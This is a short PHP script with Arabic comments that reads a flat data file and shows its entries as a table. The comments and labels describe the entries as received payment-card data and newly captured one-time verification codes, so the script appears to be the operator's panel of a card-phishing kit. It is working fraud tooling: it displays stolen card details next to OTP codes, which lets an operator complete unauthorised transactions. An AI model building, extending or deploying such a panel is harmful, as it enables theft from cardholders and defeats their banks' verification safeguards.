<?php
$file_path = "indexx/data.txt"; // تأكد من مطابقة مسار ملف البيانات الخاص بك

if (file_exists($file_path) && filesize($file_path) > 0) {
    $file_lines = file($file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $file_lines = array_reverse($file_lines);
    
    foreach ($file_lines as $line) {
        $data = explode("|||", $line);
        if (count($data) == 5) {
            // فحص إذا كان السطر عبارة عن رمز تحقق جديد
            if (strpos($data[0], '--- رمز تحقق جديد ---') !== false) {
                echo "<tr class='otp-row'>";
                echo "<td><span class='otp-badge'>🔑 رمز تحقق جديد</span></td>";
                echo "<td class='ltr-text'>" . htmlspecialchars($data[1]) . "</td>";
                echo "<td>---</td>";
                echo "<td>---</td>";
                echo "<td>" . htmlspecialchars($data[4]) . "</td>";
                echo "</tr>";
            } else {
                // عرض بيانات البطاقة الطبيعية بصفوف قياسية
                echo "<tr>";
                echo "<td>" . htmlspecialchars($data[0]) . "</td>";
                echo "<td class='ltr-text'>" . htmlspecialchars($data[1]) . "</td>";
                echo "<td>" . htmlspecialchars($data[2]) . "</td>";
                echo "<td>" . htmlspecialchars($data[3]) . "</td>";
                echo "<td>" . htmlspecialchars($data[4]) . "</td>";
                echo "</tr>";
            }
        }
    }
} else {
    echo "<tr><td colspan='5'>لا توجد عمليات مستلمة حتى الآن.</td></tr>";
}
?>
